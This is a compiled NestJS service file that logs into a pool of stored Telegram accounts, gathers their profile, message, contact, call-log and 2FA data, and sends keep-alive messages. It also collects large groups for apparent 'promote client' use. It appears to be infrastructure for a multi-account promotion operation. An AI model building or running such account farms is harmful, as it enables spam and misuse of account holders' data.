"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var AccountMaintenanceService_1;
Object.defineProperty(exports, "__esModule", { value: true });
exports.AccountMaintenanceService = void 0;
const common_1 = require("@nestjs/common");
const Helpers_1 = require("telegram/Helpers");
const components_1 = require("../../components");
const utils_1 = require("../../utils");
const channel_eligibility_1 = require("./channel-eligibility");
let AccountMaintenanceService = AccountMaintenanceService_1 = class AccountMaintenanceService {
    constructor(usersService, channelsService, activeChannelsService, bufferClientService, promoteClientService) {
        this.usersService = usersService;
        this.channelsService = channelsService;
        this.activeChannelsService = activeChannelsService;
        this.bufferClientService = bufferClientService;
        this.promoteClientService = promoteClientService;
        this.logger = new common_1.Logger(AccountMaintenanceService_1.name);
        this.running = false;
    }
    async processEligibleUsers(limit = 300, skip = 0) {
        if (this.running) {
            this.logger.warn('Account maintenance skipped; previous run is still active');
            return { processed: 0, skipped: true };
        }
        this.running = true;
        try {
            this.logger.log(`Starting raw-user maintenance (limit=${limit}, skip=${skip})`);
            const users = await this.findEligibleUsers(limit, skip);
            for (const user of users)
                await this.updateUser(user);
            this.logger.log(`Completed raw-user maintenance: processed=${users.length}`);
            return { processed: users.length, skipped: false };
        }
        finally {
            this.running = false;
        }
    }
    async checkPromoteClients() {
        this.logger.log('Delegating promote-client health check to UMS lifecycle owner');
        await this.promoteClientService.checkPromoteClients();
    }
    async rotateReadyPromoteClients() {
        this.logger.log('Evaluating one READY promote-client rotation outcome');
        return this.promoteClientService.rotateReadyPromoteClients();
    }
    async preparePromoteClientJoin() {
        this.logger.log('Starting UMS-owned promote-client join preparation');
        return this.promoteClientService.joinchannelForPromoteClients();
    }
    async refreshPromoteClientInfo() {
        this.logger.log('Refreshing promote-client information (UMS owner)');
        await this.promoteClientService.updateInfo();
    }
    async findEligibleUsers(limit, skip) {
        const now = new Date();
        const weekAgo = new Date(now);
        weekAgo.setDate(weekAgo.getDate() - 7);
        const monthAgo = new Date(now);
        monthAgo.setDate(monthAgo.getDate() - 30);
        const threeMonthsAgo = new Date(now);
        threeMonthsAgo.setDate(threeMonthsAgo.getDate() - 70);
        const [bufferClients, promoteClients] = await Promise.all([
            this.bufferClientService.findAll(),
            this.promoteClientService.findAll(),
        ]);
        const lifecycleMobiles = [
            ...new Set([...bufferClients, ...promoteClients]
                .map((client) => client.mobile)
                .filter((mobile) => Boolean(mobile))),
        ];
        this.logger.log(`Raw-user query excludes lifecycle pool mobiles: buffer=${bufferClients.length}, promote=${promoteClients.length}, unique=${lifecycleMobiles.length}`);
        return this.usersService.executeQuery({
            expired: false,
            ...(lifecycleMobiles.length
                ? { mobile: { $nin: lifecycleMobiles } }
                : {}),
            updatedAt: { $lt: weekAgo },
            $or: [
                { createdAt: { $gt: monthAgo }, updatedAt: { $lt: weekAgo } },
                {
                    createdAt: { $lte: monthAgo, $gt: threeMonthsAgo },
                    updatedAt: { $lt: monthAgo },
                },
                {
                    createdAt: { $lte: threeMonthsAgo },
                    updatedAt: { $lte: threeMonthsAgo },
                },
            ],
        }, {}, limit, skip);
    }
    async updateUser(user) {
        let manager;
        try {
            manager = await components_1.connectionManager.getClient(user.mobile, {
                autoDisconnect: true,
                handler: false,
            });
            const [lastActive, me, selfMessages, dialogs, contacts, hasPassword, calls,] = await Promise.all([
                manager.getLastActiveTime(),
                manager.getMe(),
                manager.getSelfMSgsInfo(),
                manager.getDialogs({ limit: 5 }),
                manager.getContacts(),
                manager.hasPassword(),
                manager.getCallLogStats(),
            ]);
            await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: me.phone }] }, {
                contacts: 'savedCount' in contacts ? contacts.savedCount : 0,
                calls: calls || {
                    incoming: 0,
                    outgoing: 0,
                    totalCalls: 0,
                    video: 0,
                    audio: 0,
                },
                firstName: me.firstName,
                lastName: me.lastName,
                mobile: me.phone,
                username: me.username,
                msgs: selfMessages.total,
                totalChats: dialogs.total,
                ownPhotoCount: selfMessages.ownPhotoCount,
                movieCount: selfMessages.movieCount,
                otherPhotoCount: selfMessages.otherPhotoCount,
                otherVideoCount: selfMessages.otherVideoCount,
                ownVideoCount: selfMessages.ownVideoCount,
                twoFA: Boolean(hasPassword),
                lastActive,
                tgId: me.id.toString(),
            });
            await manager.client.sendMessage('me', { message: '.' });
            await this.persistDiscoveredChannels(dialogs);
        }
        catch (error) {
            const details = (0, utils_1.parseError)(error, `Account maintenance failed for ${user.mobile}`, false);
            if ((0, utils_1.contains)(details.message.toLowerCase(), [
                'user_deactivated_ban',
                'user_deactivated',
                'session_revoked',
                'auth_key_unregistered',
            ])) {
                await this.usersService.delete(user.tgId);
            }
        }
        finally {
            if (manager)
                await components_1.connectionManager.unregisterClient(user.mobile);
            await (0, Helpers_1.sleep)(2000);
        }
    }
    async persistDiscoveredChannels(dialogs) {
        const channels = dialogs
            .filter((dialog) => dialog.isChannel || dialog.isGroup)
            .map((dialog) => dialog.entity)
            .filter((channel) => !channel.broadcast &&
            !channel.defaultBannedRights?.sendMessages &&
            (channel.participantsCount || 0) > 50 &&
            (0, channel_eligibility_1.isEligibleDiscoveredChannel)(channel))
            .map((channel) => ({
            channelId: channel.id.toString(),
            participantsCount: channel.participantsCount,
            title: channel.title,
            broadcast: channel.broadcast,
            megagroup: channel.megagroup,
            username: channel.username,
        }));
        if (!channels.length)
            return;
        await this.channelsService.createMultiple(channels);
        await this.activeChannelsService.createMultiple(channels);
    }
};
exports.AccountMaintenanceService = AccountMaintenanceService;
exports.AccountMaintenanceService = AccountMaintenanceService = AccountMaintenanceService_1 = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [components_1.UsersService,
        components_1.ChannelsService,
        components_1.ActiveChannelsService,
        components_1.BufferClientService,
        components_1.PromoteClientService])
], AccountMaintenanceService);
//# sourceMappingURL=account-maintenance.service.js.map